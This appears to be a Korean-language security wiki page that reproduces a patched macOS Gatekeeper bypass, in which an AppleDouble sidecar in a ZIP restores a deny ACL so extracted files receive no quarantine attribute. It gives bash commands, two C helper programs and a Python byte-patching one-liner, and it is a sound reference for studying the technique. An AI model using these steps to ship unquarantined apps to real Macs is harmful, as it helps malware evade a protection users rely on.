# AppleDouble ACL Quarantine Bypass 재현

{{#include ../../../../banners/hacktricks-training.md}}

이 역사적인 proof of concept는 Achilles Gatekeeper bypass 연구에서 사용된 AppleDouble/ACL 기법을 재현합니다. ACL을 직렬화해 AppleDouble 사이드카에 저장하고, 속성 이름을 `com.apple.acl.text`로 바꾼 다음 ZIP 파일을 다시 패키징합니다.<sup>[[1]](#references)[[2]](#references)</sup>

Apple은 macOS Ventura 13, Monterey 12.6.2, Big Sur 11.7.2에서 Gatekeeper bypass를 수정했습니다. 현재 Mac에서 ACL을 복원해도 Gatekeeper bypass가 작동한다는 것을 보여주지는 않습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Quarantine 및 최초 실행 검사에 대한 내용은 [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses)를 참조하세요.

## ACL 및 AppleDouble 파일 시스템 동작

### writeextattr ACL

이 ACL은 파일에 `xattrs`를 추가하지 못하게 합니다.

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```

### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 파일 형식은 ACE를 포함해 파일을 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 xattr **`com.apple.acl.text`**에 저장된 ACL 텍스트 표현이 압축 해제된 파일의 ACL로 설정되는 것을 확인할 수 있습니다. 따라서 다른 xattr이 기록되지 못하도록 하는 ACL이 설정된 애플리케이션을 **AppleDouble** 파일 형식의 zip 파일로 압축하면... 해당 애플리케이션에는 quarantine xattr이 설정되지 않습니다.

자세한 내용은 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.<sup>[[1]](#references)</sup>

이를 재현하려면 먼저 올바른 ACL 문자열을 가져와야 합니다:

```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```

(이 방법이 작동하더라도 sandbox가 먼저 quarantine xattr을 기록한다는 점에 유의하세요)

## AppleDouble 사이드카 구성 및 검증

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
./get_acls /tmp/test
ACL for /tmp/test:
!#acl 1
group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown

ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a
```

<details>

<summary>get_acls 코드</summary>

```c
// clang -o get_acls get_acls.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/acl.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *filepath = argv[1];
    acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
    if (acl == NULL) {
        perror("acl_get_file");
        return 1;
    }

    char *acl_text = acl_to_text(acl, NULL);
    if (acl_text == NULL) {
        perror("acl_to_text");
        acl_free(acl);
        return 1;
    }

    printf("ACL for %s:\n%s\n", filepath, acl_text);

    // Convert acl_text to hexadecimal and print it
    printf("ACL in hex: ");
    for (char *c = acl_text; *c != '\0'; c++) {
        printf("\\x%02x", (unsigned char)*c);
    }
    printf("\n");

    acl_free(acl);
    acl_free(acl_text);
    return 0;
}
```

</details>

```bash
# Add the com.apple.xxx.xxxx extended attribute containing the ACL
mkdir start
mkdir start/protected
./set_xattr start/protected
echo something > start/protected/something
```

<details>

<summary>set_xattr 코드</summary>

```c
// gcc -o set_xattr set_xattr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/xattr.h>
#include <sys/acl.h>


void print_xattrs(const char *filepath) {
    ssize_t buflen = listxattr(filepath, NULL, 0, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        return;
    }

    char *buf = malloc(buflen);
    if (buf == NULL) {
        perror("malloc");
        return;
    }

    buflen = listxattr(filepath, buf, buflen, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        free(buf);
        return;
    }

    printf("All current extended attributes for %s:\n", filepath);
    for (char *name = buf; name < buf + buflen; name += strlen(name) + 1) {
        printf("%s: ", name);
        ssize_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            continue;
        }

        char *value = malloc(valuelen + 1);
        if (value == NULL) {
            perror("malloc");
            continue;
        }

        valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            free(value);
            continue;
        }

        value[valuelen] = '\0';  // Null-terminate the value
        printf("%s\n", value);
        free(value);
    }

    free(buf);
}


int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a";
    const char *filepath = argv[1];

    int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0);
    if (result == 0) {
        printf("Extended attribute set successfully.\n\n");
    } else {
        perror("setxattr");
        return 1;
    }

    print_xattrs(filepath);

    return 0;
}
```

</details>

```bash
# Create an AppleDouble file containing the extended attribute
ditto -c -k start protected.zip
rm -rf start
# extract the files
unzip protected.zip
# Replace the extended-attribute name here (ditto would otherwise remove com.apple.acl.text)
python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
# zip everything back together
rm -rf protected.zip
zip -r protected.zip protected ._protected
rm -rf protected
rm ._*
```

```bash
# Check whether the AppleDouble ACL was restored; an ACL is not itself a normal xattr
ditto -x -k --rsrc protected.zip .
ls -lde protected
# A local ditto extraction alone does not test browser/Archive Utility quarantine propagation
xattr -p com.apple.quarantine protected
```



## References

- [1] [Microsoft Security Blog — Gatekeeper의 아킬레스건: macOS 취약점 파헤치기](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [2] [Apple Developer — `ditto`를 사용한 배포용 Mac 소프트웨어 패키징](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
- [3] [Apple Support — macOS Ventura 13의 보안 콘텐츠 정보](https://support.apple.com/en-ae/102853)
- [4] [Apple Support — macOS Monterey 12.6.2의 보안 콘텐츠 정보](https://support.apple.com/en-ae/102806)
- [5] [Apple Support — macOS Big Sur 11.7.2의 보안 콘텐츠 정보](https://support.apple.com/en-us/102785)
{{#include ../../../../banners/hacktricks-training.md}}
